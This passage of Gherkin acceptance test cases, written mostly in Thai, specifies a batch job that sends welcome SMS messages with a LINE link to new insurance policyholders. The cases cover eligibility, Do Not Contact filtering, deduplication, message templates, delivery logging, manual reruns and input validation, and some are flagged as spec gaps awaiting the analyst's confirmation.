  Scenario: ไม่พบทั้ง LINE และ Ocean Club → ส่ง SMS
    Given ลูกค้า card_no = "1409900111222" ผ่านการคัดกรอง Do Not Contact แล้ว
    And Line Connect Inquiry ตอบกลับ code="E02" channel="LINE" (ไม่พบ LINE)
    And Line Connect Inquiry ตอบกลับ code="E02" channel="APP" (ไม่พบ Ocean Club)
    When batch ตัดสิน eligibility
    Then ลูกค้ารายนั้นเข้าเกณฑ์ "ส่ง SMS" ตามเงื่อนไขที่ 1 ของ BR-003
```

```gherkin
# Covers: FR-006, BR-003
Feature: TC-007 LINE Eligibility — เงื่อนไข 2
  Scenario: ไม่มี Ocean Club และบล็อก LINE → ส่ง SMS
    Given ลูกค้า card_no = "1409900111333" ผ่านการคัดกรอง Do Not Contact แล้ว
    And Line Connect Inquiry ตอบกลับ channel="LINE" พร้อม isBlockLine = true
    And Line Connect Inquiry ตอบกลับ code="E02" channel="APP" (ไม่พบ Ocean Club)
    When batch ตัดสิน eligibility
    Then ลูกค้ารายนั้นเข้าเกณฑ์ "ส่ง SMS" ตามเงื่อนไขที่ 2 ของ BR-003
```

```gherkin
# Covers: FR-006, BR-003, SC-002, ALT-001
Feature: TC-008 LINE Eligibility — เงื่อนไข 3
  Scenario Outline: พบ LINE (ไม่บล็อก) หรือพบ Ocean Club → ไม่ส่ง SMS
    Given ลูกค้า card_no = "<card_no>" ผ่านการคัดกรอง Do Not Contact แล้ว
    And Line Connect Inquiry ตอบกลับ LINE = "<line_status>" และ Ocean Club = "<club_status>"
    When batch ตัดสิน eligibility
    Then ลูกค้ารายนั้นไม่เข้าเกณฑ์ส่ง SMS (ALT-001)
    And ไม่มีการเรียกบริการส่งสำหรับลูกค้ารายนั้น

    Examples:
      | card_no       | line_status                | club_status   |
      | 1409900111444 | พบ LINE, isBlockLine=false | ไม่พบ (E02)   |
      | 1409900111555 | ไม่พบ (E02)                | พบ Ocean Club |
      | 1409900111666 | พบ LINE, isBlockLine=false | พบ Ocean Club |
```

```gherkin
# Covers: FR-007, MSG-002
Feature: TC-009 E02 Internal Handling
  Scenario: code=E02 ใช้ตัดสิน eligibility ภายใน ไม่แสดงข้อความต่อผู้ใช้
    Given Line Connect Inquiry ตอบกลับ code="E02" (Customer not found)
    When batch ประมวลผลผลลัพธ์
    Then ระบบใช้ E02 เป็นสัญญาณ "ไม่พบการลงทะเบียน" ตาม FR-006
    And ไม่มีการส่ง error message ใด ๆ ออกสู่ผู้ใช้หรือ email แจ้งเตือน
    And ไม่ถือเป็นความล้มเหลวระดับรอบ
```

```gherkin
# Covers: FR-009, BR-004, SC-003
Feature: TC-010 In-round Dedup
  Scenario: ชื่อ-นามสกุล-เบอร์ซ้ำในรอบ → ส่ง 1 Transaction อ้างอิง MIN(issue_date)
    Given วันประมวลผลคือ "2026-05-14"
    And ลูกค้า fname="สมชาย" lname="ใจดี" mobile_no="0845012341" มีกรมธรรม์เข้าเงื่อนไข 2 ฉบับ
      | policy_no | policy_type | issue_date |
      | 2445901   | ORD         | 2026-05-13 |
      | 4220003   | PA          | 2026-05-13 |
    And กรมธรรม์ทั้ง 2 ฉบับผ่าน FR-005 และ FR-006 แล้ว
    When batch ตัดรายการซ้ำตาม (fname, lname, mobile_no)
    Then มี 1 Transaction เท่านั้นสำหรับลูกค้ารายนี้
    And Transaction นั้นอ้างอิงกรมธรรม์ที่มี MIN(issue_date)
```

```gherkin
# Covers: FR-010, BR-005, PRE-004, SC-003, ALT-002
Feature: TC-011 History Guard
  Scenario: เคยส่งสำเร็จแล้ว → ตัดออก ไม่ส่งซ้ำ
    Given ตาราง WELCOME_NEW_CUST_LINE มี row: policy_no="2445901", policy_type="ORD", fname="สมชาย", lname="ใจดี", sms_sent_date="2026-05-14 10:00:05"
    And รอบประมวลผลถัดไปดึงกรมธรรม์ "2445901" ของลูกค้ารายเดียวกันขึ้นมาอีก
    When batch ตรวจประวัติก่อนส่ง
    Then รายการนั้นถูกตัดออกจากกลุ่มเป้าหมาย
    And ไม่มีการเรียกบริการส่งซ้ำ
```

```gherkin
# Covers: FR-011, BR-006
Feature: TC-012 Template — Schedule First
  Scenario: ใช้ template จาก sms_message_schedule เป็นอันดับแรก
    Given ตาราง sms_message_schedule มี template ที่ active สำหรับ sms_category_code = "113"
    And ตาราง SMS_CATEGORY code "113" มี msg_text เป็นข้อความ default ที่ต่างออกไป
    When batch สร้างข้อความ SMS
    Then ข้อความถูกสร้างจาก template ของ sms_message_schedule
    And ไม่ใช้ msg_text ของ SMS_CATEGORY
```

```gherkin
# Covers: FR-011, BR-006
Feature: TC-013 Template — Fallback
  Scenario: ไม่พบ schedule → fallback ใช้ msg_text ของ SMS_CATEGORY
    Given ตาราง sms_message_schedule ไม่มี template ที่ active สำหรับ sms_category_code = "113"
    And ตาราง SMS_CATEGORY code "113" (sms_category_name = "MKTWelcomeNewCust") มี msg_text
    When batch สร้างข้อความ SMS
    Then ข้อความถูกสร้างจาก msg_text ของ SMS_CATEGORY code "113"
```

```gherkin
# Covers: FR-012, BR-006, SC-005
Feature: TC-014 Variable Substitution
  Scenario: แทนค่า $(var1) และ $(var2)
    Given template = "เรียน คุณ$(var1) OCEAN LIFE ไทยสมุทร ให้ความคุ้มครองท่านแล้ว ดูรายละเอียดกรมธรรม์ผ่าน LINE OCEAN CONNECT คลิก $(var2) สอบถามโทร.1503"
    And ลูกค้าชื่อ fname = "สมชาย"
    And ตาราง cf_catalog มี row: config_type="LINE_LINK", config_value1="CSMS_SNC_NewCust", ลิงก์="https://lin.ee/xd7mW2g", begin_date <= วันประมวลผล <= expire_date, active_flag="Y"
    When batch สร้างข้อความ SMS
    Then ข้อความที่ได้ = "เรียน คุณสมชาย OCEAN LIFE ไทยสมุทร ให้ความคุ้มครองท่านแล้ว ดูรายละเอียดกรมธรรม์ผ่าน LINE OCEAN CONNECT คลิก https://lin.ee/xd7mW2g สอบถามโทร.1503"
    And ไม่มี placeholder "$(var1)" หรือ "$(var2)" หลงเหลือในข้อความ
```

```gherkin
# Covers: FR-014, POST-001
Feature: TC-015 ESB Delivery
  Scenario: เรียก Web Service กลาง (ESB) ส่ง SMS ผ่าน SMS Gateway สำเร็จ
    Given มีรายการที่ผ่านการคัดกรองครบทุกขั้นตอนและมีข้อความพร้อมส่ง
    When batch เรียกบริการส่งผ่าน ESB
    Then บริการตอบกลับสถานะสำเร็จ
    And ระบบได้รับ refer_no กลับมา
```

```gherkin
# Covers: FR-015, POST-002
Feature: TC-016 CSMS_LOG
  Scenario: บันทึก CSMS_LOG พร้อม refer_no และสถานะที่ได้รับกลับ
    Given batch ส่ง SMS สำเร็จและได้รับ refer_no = "RF20260514100005001"
    When batch บันทึกประวัติ
    Then มี row ใหม่ใน CSMS_LOG
    And CSMS_LOG.sms_category_name_abbr = ชื่อย่อหมวดของ code "113"
    And CSMS_LOG.sms_message = ข้อความที่ส่งจริง
    And refer_no และสถานะที่ได้รับกลับจาก Web Service ถูกบันทึกไว้
```

```gherkin
# Covers: FR-016, POST-003
Feature: TC-017 Batch History — Full Field Set
  Scenario: บันทึก WELCOME_NEW_CUST_LINE ครบทุก field
    Given batch ส่ง SMS ให้กรมธรรม์ "2445901" สำเร็จเมื่อ "2026-05-14 10:00:05"
    When batch บันทึกลง WELCOME_NEW_CUST_LINE
    Then row ที่บันทึกมีค่าครบทุก field ต่อไปนี้
      | field         | expected               |
      | policy_no     | 2445901                |
      | policy_type   | ORD                    |
      | title_name    | นาย                    |
      | fname         | สมชาย                  |
      | lname         | ใจดี                   |
      | card_no       | 1409900111222          |
      | issue_date    | 2026-05-13             |
      | sms_sent_date | 2026-05-14 10:00:05    |
      | mobile_no     | 0845012341             |
      | sms_message   | (ข้อความที่ส่งจริง)    |
      | credit_amount | (ค่าที่คำนวณตาม FR-017) |
      | sent_status   | S                      |
      | created_by    | SYSTEM_BATCH           |
      | created_date  | (timestamp ที่บันทึก)  |
```

```gherkin
# Covers: FR-016a
Feature: TC-018 Sent Status — Success
  Scenario: ส่งสำเร็จ → sms_sent_date = เวลาที่ส่ง และ sent_status = 'S'
    Given batch เรียกบริการส่งและได้รับผลสำเร็จสำหรับกรมธรรม์ "2445901"
    When batch บันทึกผล
    Then WELCOME_NEW_CUST_LINE.sms_sent_date ไม่เป็น NULL
    And WELCOME_NEW_CUST_LINE.sent_status = "S"
```

```gherkin
# Covers: FR-017, A-011, Q-005
Feature: TC-019 Credit Calculation
  Scenario: คำนวณ credit_amount ด้วย logic เดิมของ CSMS
    Given ข้อความ SMS ภาษาไทยยาว 140 ตัวอักษร (UCS-2)
    When batch คำนวณ credit_amount ด้วย logic เดียวกับ batch SMS อื่นของ CSMS
    Then credit_amount = 2
    And ค่าที่ได้ตรงกับผลของ utility คำนวณ credit เดิมที่ใช้ร่วมกัน (reuse ไม่ใช่เขียนใหม่)
```

```gherkin
# Covers: FR-018, BR-008, MSG-001, SC-004, Q-002
Feature: TC-020 Round-level Failure Alert
  Scenario Outline: ล้มเหลวระดับรอบ "<failed_step>" → ส่ง Email แจ้งเตือน IT/User
    Given batch "BATCH-CSMS-WELCOME-LINE" เริ่มรันรอบวันที่ "2026-05-15"
    And เกิดความล้มเหลวระดับรอบที่ขั้นตอน "<failed_step>"
    When batch ตรวจพบความล้มเหลว
    Then ระบบส่ง Email แจ้งเตือนทีม IT และ User ตามรูปแบบมาตรฐานของ batch CSMS เดิม
    And email ระบุชื่อ batch = "BATCH-CSMS-WELCOME-LINE"
    And email ระบุขั้นตอนที่ล้มเหลว = "<failed_step>"
    And ไม่มีการส่ง SMS ต่อในรอบนั้น

    Examples:
      | failed_step                                              |
      | generate ไฟล์ไม่ได้ตามเวลาที่กำหนด (@disputed @csv-path) |
      | เรียก ESB/SMS Gateway ไม่ได้                             |
      | ดึงข้อมูลต้นทาง/บันทึกฐานข้อมูลล้มเหลว                   |
      | Line Connect API ล่มทั้งระบบ (FR-008b)                   |
      | ไม่มีลิงก์แคมเปญ active (FR-012a)                        |
```

```gherkin
# Covers: FR-019, Q-004, MSG-004
Feature: TC-021 Manual Fix — Valid Trigger
  Scenario: IT Admin สั่งรัน Manual Batch ด้วยช่วงวันที่ที่ถูกต้อง
    Given IT Admin login เข้าหน้า Manual Fix ของ Admin Dashboard กลาง CSMS
    And batch "BATCH-CSMS-WELCOME-LINE" ปรากฏใน list ของหน้าเดิม
    When IT Admin เลือก batch นั้น ระบุวันที่เริ่มต้น = "2026-05-15" และวันที่สิ้นสุด = "2026-05-15" แล้วกด Manual Batch
    Then ระบบเริ่มประมวลผลย้อนหลังเฉพาะช่วงวันที่ที่เลือก
    And ระบบไม่แสดง validation error
```

```gherkin
# Covers: FR-020, EC-004, ALT-003, SC-003
Feature: TC-022 Manual Fix Idempotency
  Scenario: Manual Batch ซ้ำ → ไม่ส่งซ้ำรายการที่เคยส่งสำเร็จ
    Given ช่วงวันที่ "2026-05-15" เคยรันสำเร็จบางส่วน — มี 3 รายการที่ sms_sent_date ไม่ว่าง และ 2 รายการที่ sms_sent_date IS NULL
    When IT Admin สั่ง Manual Batch ช่วงวันที่ "2026-05-15" ถึง "2026-05-15" อีกครั้ง
    Then ระบบส่ง SMS เฉพาะ 2 รายการที่ sms_sent_date IS NULL
    And 3 รายการที่เคยส่งสำเร็จไม่ถูกส่งซ้ำ
    And จำนวน SMS ที่ส่งจริงทั้งหมด = 2
```

```gherkin
# Covers: FR-020a
Feature: TC-023 Manual Fix Date Interpretation
  Scenario: ช่วงวันที่ = วันประมวลผล → ดึง issue_date = T-1 ของแต่ละวัน
    Given IT Admin เลือกช่วงวันที่ซ่อมข้อมูล = "2026-05-15" ถึง "2026-05-16"
    When ระบบประมวลผล Manual Batch
    Then สำหรับวันประมวลผล "2026-05-15" ระบบดึงกรมธรรม์ issue_date = "2026-05-14"
    And สำหรับวันประมวลผล "2026-05-16" ระบบดึงกรมธรรม์ issue_date = "2026-05-15"
    And ผลลัพธ์เหมือนการ re-run รอบที่หายไปทุกประการ
```

```gherkin
# Covers: FR-021, SC-007, Q-006
Feature: TC-024 Daily Report
  Scenario: รายงานประจำวันแสดงยอดครบพร้อม breakdown ตาม policy_type
    Given batch รอบวันที่ "2026-05-14" ประมวลผลเสร็จแล้ว
    And WELCOME_NEW_CUST_LINE มีข้อมูลของรอบนั้นครบ
    When ผู้ใช้เรียกดู "รายงานการส่ง SMS Welcome New Customer (LINE)" ของวันที่ "2026-05-14"
    Then รายงานแสดงจำนวนรายการที่ประมวลผลทั้งหมด
    And แสดงจำนวนที่ส่งสำเร็จ (sent_status='S')
    And แสดงจำนวนที่ไม่สำเร็จ/ถูก skip (sent_status='F')
    And แสดงจำนวนที่ถูกตัดออกแยกตามเหตุผล (Do Not Contact / ลงทะเบียนแล้ว / ซ้ำในรอบ / เคยส่งแล้ว)
    And แสดง breakdown แยกตาม policy_type (ORD/IND/PA)
```

```gherkin
# Covers: SC-001, FR-001, FR-002, FR-005, FR-006, FR-009, FR-010, FR-011, FR-012, FR-014, FR-015, FR-016, FR-016a
Feature: TC-025 End-to-End Happy Path
  Scenario: กรมธรรม์ 2445901 → SMS ถึง 0845012341 ข้อความถูกต้อง (spec.md US1 Acceptance #1)
    Given กรมธรรม์เลขที่ "2445901" ประเภท ORD, issue_date = "2026-05-13", สถานะ Inforce
    And มีเบอร์โทร "0845012341" และชื่อ "สมชาย"
    And ไม่อยู่ใน Do Not Contact List
    And Line Connect Inquiry ตอบ code="E02" channel="LINE" และ code="E02" channel="APP"
    And cf_catalog มีลิงก์ "https://lin.ee/xd7mW2g" ที่ active ณ "2026-05-14"
    When Batch รันเวลา 10:00 น. ของวันที่ "2026-05-14"
    Then ระบบส่ง SMS ข้อความ "เรียน คุณสมชาย OCEAN LIFE ไทยสมุทร ให้ความคุ้มครองท่านแล้ว ดูรายละเอียดกรมธรรม์ผ่าน LINE OCEAN CONNECT คลิก https://lin.ee/xd7mW2g สอบถามโทร.1503" ไปยัง "0845012341" สำเร็จ
    And มีการบันทึกลง CSMS_LOG
    And มีการบันทึกลง WELCOME_NEW_CUST_LINE โดย sms_sent_date = "2026-05-14 10:00:05" และ sent_status = "S"
```

### Dimension 2 — Negative/Validation

```gherkin
# Covers: FR-002, PRE-002
Feature: TC-026 Non-Inforce Excluded
  Scenario Outline: สถานะกรมธรรม์ "<status>" → ไม่ถูกดึงเข้ากลุ่มเป้าหมาย
    Given วันประมวลผลคือ "2026-05-14"
    And มีกรมธรรม์ ORD "2445902" issue_date = "2026-05-13" สถานะ "<status>"
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "2445902" ไม่ปรากฏในกลุ่มเป้าหมาย
    And ไม่มีการส่ง SMS สำหรับกรมธรรม์นั้น

    Examples:
      | status    |
      | Lapse     |
      | Pending   |
      | Cancelled |
      | Surrender |
      | (NULL)    |
```

```gherkin
# Covers: FR-002, BR-001
Feature: TC-027 issue_date != T-1 Excluded
  Scenario Outline: issue_date = "<issue_date>" (<label>) → ไม่ถูกดึง
    Given วันประมวลผลคือ "2026-05-14"
    And มีกรมธรรม์ ORD "2445903" issue_date = "<issue_date>" สถานะ Inforce
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "2445903" ไม่ปรากฏในกลุ่มเป้าหมาย

    Examples:
      | issue_date | label       |
      | 2026-05-14 | T-0 วันนี้  |
      | 2026-05-12 | T-2 สองวัน  |
      | 2026-04-14 | T-30        |
      | 2026-05-15 | อนาคต       |
```

```gherkin
# Covers: FR-003, A-006
Feature: TC-028 Pre-2026 Excluded
  Scenario: กรมธรรม์ที่ออกก่อนปี 2026 → ไม่ถูกดึง (spec.md US1 Acceptance #8)
    Given วันประมวลผลคือ "2026-01-02"
    And มีกรมธรรม์ ORD "2445904" issue_date = "2026-01-01" สถานะ Inforce แต่เป็นกรมธรรม์ที่ออกก่อนปี 2026 (policy_year = 2025)
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "2445904" ไม่ปรากฏในกลุ่มเป้าหมาย
    And ไม่มีการส่ง SMS ย้อนหลังก่อนวันที่ UR Go-live
```

```gherkin
# Covers: FR-004, EC-001
Feature: TC-029 Empty Mobile Excluded
  Scenario Outline: mobile_no = "<mobile_no>" (<label>) → ไม่ถูกดึง
    Given กรมธรรม์ ORD "2445905" issue_date = T-1 สถานะ Inforce
    And mobile_no = "<mobile_no>"
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์ "2445905" ไม่ปรากฏในกลุ่มเป้าหมายตั้งแต่ขั้นตอนคัดเลือก
    And ไม่มีการเรียก Line Connect Inquiry สำหรับรายการนั้น

    Examples:
      | mobile_no | label            |
      | (NULL)    | ค่า NULL         |
      |           | สตริงว่าง        |
      | "   "     | ช่องว่างล้วน     |
      | "\t"      | tab อย่างเดียว   |
```

```gherkin
# Covers: FR-005, BR-002, SC-002, Q-001
Feature: TC-030 Do Not Contact — ORD
  Scenario: ORD อยู่ใน Do Not Contact (remark_code='1') → ตัดออก (spec.md US1 Acceptance #2)
    Given กรมธรรม์ ORD "2445901" เข้าเงื่อนไข FR-002/FR-003/FR-004 ครบ
    And ตาราง ili_policy_remark มี row: policy_no="2445901", policy_type='O', remark_code='1'
    When batch คัดกรอง Do Not Contact
    Then กรมธรรม์ "2445901" ถูกตัดออกจากกลุ่มเป้าหมาย
    And ไม่มีการส่ง SMS ไปยังลูกค้ารายนั้น
```

```gherkin
# Covers: FR-005, BR-002, SC-002, Q-001
Feature: TC-031 Do Not Contact — IND/PA
  Scenario Outline: <policy_type> อยู่ใน Do Not Contact (remark_code='4') → ตัดออก
    Given กรมธรรม์ "<policy_type>" เลขที่ "<policy_no>" เข้าเงื่อนไข FR-002/FR-003/FR-004 ครบ
    And ตาราง ili_policy_remark มี row: policy_no="<policy_no>", policy_type="<mapped_type>", remark_code='4'
    When batch คัดกรอง Do Not Contact
    Then กรมธรรม์ "<policy_no>" ถูกตัดออกจากกลุ่มเป้าหมาย

    Examples:
      | policy_type | policy_no | mapped_type |
      | IND         | 3110002   | I           |
      | IND         | 3110009   | G           |
      | PA          | 4220003   | P           |
```

```gherkin
# Covers: FR-005, A-005, Q-001
Feature: TC-032 Policy Type Mapping before DNC Check
  Scenario Outline: Mapping "<policy_type>" → "<mapped_type>" ก่อนตรวจ Do Not Contact
    Given กรมธรรม์ประเภท "<policy_type>" เลขที่ "<policy_no>" อยู่ใน Do Not Contact โดยบันทึกด้วย policy_type = "<mapped_type>"
    When batch map รหัสประเภทกรมธรรม์ต้นทาง → ปลายทาง แล้วตรวจ ili_policy_remark
    Then ระบบใช้ค่า "<mapped_type>" ในการ query ili_policy_remark
    And ตรวจพบรายการ Do Not Contact และตัดกรมธรรม์ "<policy_no>" ออก
    And ระบบ MUST NOT ใช้รหัสต้นทาง "<policy_type>" ตรง ๆ ในการ query (จะตรวจไม่พบ)

    Examples:
      | policy_type | policy_no | mapped_type |
      | ORD         | 2445901   | O           |
      | IND         | 3110002   | I           |
      | IND         | 3110009   | G           |
      | PA          | 4220003   | P           |
```

```gherkin
# Covers: FR-008, MSG-003, ALT-004, SC-006, Q-003
Feature: TC-033 E13 Skip
  Scenario: code=E13 → skip ทันที ไม่ retry ไม่หยุดรอบ + log (spec.md US1 Acceptance #7)
    Given รอบประมวลผลมี 5 รายการที่เข้าเงื่อนไข
    And Line Connect Inquiry ตอบกลับ code="E13" (Generic Error) สำหรับรายการที่ 3
    When batch ประมวลผลรอบนั้น
    Then รายการที่ 3 ถูก skip ทันทีโดยไม่มีการ retry
    And มีการบันทึก log ของรายการที่ skip เพื่อให้ IT Admin ตรวจสอบ/Manual Fix ภายหลัง
    And รอบประมวลผลไม่หยุด — รายการที่ 4 และ 5 ถูกประมวลผลต่อจนจบ
    And ไม่มี email แจ้งเตือนระดับรอบถูกส่ง
```

```gherkin
# Covers: FR-008a, EC-003
Feature: TC-034 Out-of-spec Response Skip
  Scenario Outline: ผลตอบกลับ "<response>" (นอก 3 เงื่อนไขของ FR-006) → skip + log
    Given รอบประมวลผลมี 5 รายการที่เข้าเงื่อนไข
    And Line Connect Inquiry ตอบกลับ "<response>" สำหรับรายการที่ 2
    When batch ตัดสิน eligibility
    Then รายการที่ 2 ถูก skip
    And มีการบันทึก log แยกไว้ให้ IT Admin ตรวจสอบ/Manual Fix ภายหลัง
    And รอบประมวลผลไม่หยุด รายการอื่นถูกประมวลผลต่อจนจบ

    Examples:
      | response                       |
      | channel = null                 |
      | isBlockLine = null             |
      | code = "E99" (ไม่รู้จัก)       |
      | payload ว่าง / ไม่มี field code |
      | JSON ผิดรูปแบบ                 |
```

```gherkin
# Covers: FR-008b, EC-007
Feature: TC-035 Line Connect API Down
  Scenario: API ล่มทั้งระบบ → retry สูงสุด 3 ครั้ง → หยุดรอบ + email
    Given รอบประมวลผลวันที่ "2026-05-15" มีรายการเข้าเงื่อนไข 10 รายการ
    And Line Connect API ไม่ตอบสนองเลย (service down / timeout / HTTP 5xx ทั้งระบบ)
    When batch เรียกบริการตรวจสอบสถานะ
    Then ระบบ retry สูงสุด 3 ครั้งแบบเว้นช่วง
    And เมื่อครบ 3 ครั้งยังไม่สำเร็จ ระบบหยุดรอบประมวลผลนั้น
    And ระบบส่ง Email แจ้งเตือนทีม IT และ User ผ่านช่องทางเดียวกับ FR-018 โดยระบุขั้นตอน "Line Connect API down"
    And ระบบ MUST NOT skip รายรายการแบบ FR-008
    # ⚠ F-007: spec ระบุ "เว้นช่วง" แต่ไม่มีตัวเลข interval — assert ได้เฉพาะจำนวนครั้ง = 3
```

```gherkin
# Covers: FR-011a, EC-005
Feature: TC-036 Customer Name Not Found
  Scenario: card_no ไม่พบชื่อ-นามสกุล → skip + log, ไม่ส่งข้อความไม่มีชื่อ
    Given กรมธรรม์ ORD "2445906" เข้าเงื่อนไขครบและผ่าน eligibility แล้ว
    And card_no = "9999999999999" ไม่พบ row ที่ตรงกันใน ili_customer_data_analytics
    When batch สร้างข้อความ SMS
    Then รายการนั้นถูก skip
    And มีการบันทึก log แยกไว้ให้ IT Admin ตรวจสอบ/Manual Fix ภายหลัง
    And ระบบ MUST NOT ส่งข้อความที่ไม่มีชื่อลูกค้า (ไม่มี SMS ที่ขึ้นต้น "เรียน คุณ " ตามด้วยช่องว่าง)
    And รอบประมวลผลไม่หยุด
```

```gherkin
# Covers: FR-012a, EC-006
Feature: TC-037 No Active Campaign Link
  Scenario Outline: ลิงก์แคมเปญ "<link_state>" → หยุดรอบทั้งรอบ + email
    Given วันประมวลผลคือ "2026-05-15"
    And ตาราง cf_catalog สำหรับ config_type="LINE_LINK", config_value1="CSMS_SNC_NewCust" อยู่ในสถานะ "<link_state>"
    When batch สร้างข้อความ SMS
    Then ระบบหยุดการส่งรอบนั้นทั้งรอบ
    And ไม่มี SMS ใด ๆ ถูกส่งในรอบนั้น (0 ราย)
    And ระบบส่ง Email แจ้งเตือนทีม IT และ User ผ่านช่องทางเดียวกับ FR-018 โดยระบุขั้นตอน "ไม่มีลิงก์แคมเปญ active"

    Examples:
      | link_state                     |
      | expire_date ผ่านไปแล้ว         |
      | begin_date ยังไม่ถึง           |
      | active_flag = "N"              |
      | ไม่มี row สำหรับ campaign นี้  |
```

```gherkin
# Covers: FR-019, MSG-004
Feature: TC-038 Manual Fix Date Validation
  Scenario Outline: ช่วงวันที่ "<start>" ถึง "<end>" (<label>) → validation ไม่เริ่มประมวลผล
    Given วันปัจจุบันคือ "2026-05-17"
    And IT Admin อยู่ที่หน้า Manual Fix และเลือก batch "BATCH-CSMS-WELCOME-LINE"
    When IT Admin ระบุวันที่เริ่มต้น = "<start>" วันที่สิ้นสุด = "<end>" แล้วกด Manual Batch
    Then ระบบแสดง validation และข้อความ error ตามมาตรฐานหน้าจอกลางเดิมของ CSMS
    And ระบบไม่เริ่มประมวลผล
    And ไม่มี SMS ถูกส่ง

    Examples:
      | start      | end        | label                        |
      | 2026-05-18 | 2026-05-18 | วันที่เริ่มต้นเกินวันปัจจุบัน |
      | 2026-05-16 | 2026-05-15 | วันที่สิ้นสุด < วันที่เริ่มต้น |
      | (ว่าง)     | 2026-05-15 | ไม่ระบุวันที่เริ่มต้น        |
      | 2026-05-15 | (ว่าง)     | ไม่ระบุวันที่สิ้นสุด         |
      | 15/05/2026 | 2026-05-15 | รูปแบบวันที่ผิด              |
```

```gherkin
# Covers: FR-016a
Feature: TC-039 Sent Status — Failure/Skip
  Scenario Outline: รายการ "<case>" → sms_sent_date = NULL และ sent_status = 'F'
    Given รายการหนึ่งเข้าขั้นตอนส่งหรือถูก skip ด้วยเหตุ "<case>"
    When batch บันทึกผลลง WELCOME_NEW_CUST_LINE
    Then มี row ของรายการนั้นในตาราง (ไม่หายไป)
    And sms_sent_date IS NULL
    And sent_status = "F"
    And รายการนั้นสามารถ reconcile ได้จากรายงาน FR-021

    Examples:
      | case                          |
      | skip เพราะ E13 (FR-008)       |
      | skip เพราะผลนอก 3 เงื่อนไข (FR-008a) |
      | skip เพราะไม่พบชื่อ (FR-011a) |
      | ส่งไม่สำเร็จรายรายการ         |
```

```gherkin
# Covers: FR-020b
Feature: TC-040 No Auto-retry of 'F'
  Scenario: รอบ daily MUST NOT ดึงรายการ sent_status='F' ค้างมา retry อัตโนมัติ
    Given WELCOME_NEW_CUST_LINE มี 3 รายการของวันที่ "2026-05-14" ที่ sent_status='F' และ sms_sent_date IS NULL
    When batch daily รันรอบวันที่ "2026-05-15" (ดึงกรมธรรม์ issue_date = "2026-05-14")
    Then รอบ daily ประมวลผลเฉพาะกรมธรรม์ที่ issue_date = T-1 ตามปกติ
    And ระบบ MUST NOT ดึง 3 รายการ 'F' ค้างของรอบก่อนมา retry อัตโนมัติ
    And 3 รายการ 'F' นั้นยังคงอยู่ในตารางเพื่อรายงาน/audit
```

```gherkin
# Covers: FR-014, FR-016a
Feature: TC-041 Per-record Delivery Failure
  Scenario: SMS Gateway ตอบล้มเหลวรายรายการ → รายการนั้น 'F' รอบไม่หยุด
    Given รอบประมวลผลมี 5 รายการพร้อมส่ง
    And บริการส่งตอบกลับสถานะล้มเหลวสำหรับรายการที่ 2 เท่านั้น (บริการโดยรวมยังตอบสนองปกติ)
    When batch ส่ง SMS ทั้งรอบ
    Then รายการที่ 2 ถูกบันทึก sent_status='F' และ sms_sent_date IS NULL
    And รายการที่ 1, 3, 4, 5 ถูกส่งสำเร็จและบันทึก sent_status='S'
    And รอบประมวลผลไม่หยุด และไม่มี email แจ้งเตือนระดับรอบ
    # ⚠ F-006 (checklist CHK024 / G5): spec ไม่มี edge case รองรับความล้มเหลวรายรายการของ Gateway
    #   พฤติกรรมข้างต้นเป็นการอนุมานจาก FR-016a — ต้องให้ SA ยืนยันก่อน execute
```

```gherkin
# Covers: FR-015
Feature: TC-042 Malformed refer_no  @spec_gap
  Scenario Outline: refer_no = "<refer_no>" (<label>) → พฤติกรรมไม่ระบุใน spec
    Given batch เรียกบริการส่งและบริการตอบกลับสถานะสำเร็จ
    And refer_no ที่ได้รับกลับมาคือ "<refer_no>"
    When batch บันทึก CSMS_LOG
    Then [NEEDS CLARIFICATION] spec ไม่ระบุพฤติกรรม — ถือเป็นสำเร็จ ('S') หรือไม่สำเร็จ ('F')?
    And QA เสนอค่าคาดหวัง: บันทึก sent_status='F' + log เพื่อ Manual Fix เพราะไม่มี reference ให้ตามรอย

    Examples:
      | refer_no        | label            |
      | (null)          | ค่า null         |
      |                 | สตริงว่าง        |
      | "   "           | ช่องว่างล้วน     |
      | "ERR"           | ไม่ใช่รูปแบบ ref |
      | (ยาว 500 ตัว)   | เกินความยาวคอลัมน์ |
    # ⚠ F-006 — Blocker ต่อการ execute: ต้องให้ SA เพิ่ม FR/edge case ก่อน (checklist CHK024 / G5)
```

```gherkin
# Covers: FR-011
Feature: TC-043 Template Not Found Anywhere  @spec_gap
  Scenario: ไม่พบ template ทั้ง sms_message_schedule และ SMS_CATEGORY
    Given ตาราง sms_message_schedule ไม่มี template ที่ active สำหรับ sms_category_code = "113"
    And ตาราง SMS_CATEGORY code "113" มี msg_text เป็น NULL หรือไม่มี row เลย
    When batch สร้างข้อความ SMS
    Then [NEEDS CLARIFICATION] spec FR-011 ระบุ fallback chain แต่ไม่ระบุปลายทางเมื่อ fallback ล้มเหลว
    And QA เสนอค่าคาดหวัง: หยุดรอบ + email แจ้งเตือน (แนวเดียวกับ FR-012a "ไม่มีลิงก์ active") — ต้องไม่ส่งข้อความว่าง
    And ระบบ MUST NOT ส่ง SMS ที่มีเนื้อหาว่างหรือมี placeholder ดิบ
    # ⚠ F-008 — ต้องให้ SA ยืนยันก่อน execute
```

---

### Dimension 3 — Edge

```gherkin
# Covers: FR-002
Feature: TC-044 issue_date Boundary
  Scenario Outline: ขอบเขต issue_date = "<issue_date>" → <expected>
    Given วันประมวลผลคือ "2026-05-14" และ batch เริ่มเวลา 10:00:00
    And มีกรมธรรม์ ORD issue_date/timestamp = "<issue_date>" สถานะ Inforce
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
    Then กรมธรรม์นั้น "<expected>"

    Examples:
      | issue_date          | expected            |
      | 2026-05-13 00:00:00 | ปรากฏในกลุ่มเป้าหมาย |
      | 2026-05-13 23:59:59 | ปรากฏในกลุ่มเป้าหมาย |
      | 2026-05-14 00:00:00 | ไม่ปรากฏ (เป็น T-0) |
      | 2026-05-12 23:59:59 | ไม่ปรากฏ (เป็น T-2) |
```

```gherkin
# Covers: FR-003, A-006
Feature: TC-045 Year Boundary
  Scenario Outline: ขอบเขตปี — กรมธรรม์ปี "<year>" → <expected>
    Given มีกรมธรรม์ ORD issue_date = "<issue_date>" สถานะ Inforce และวันประมวลผล = "<run_date>"
    When batch ดึงข้อมูลกลุ่มเป้าหมาย
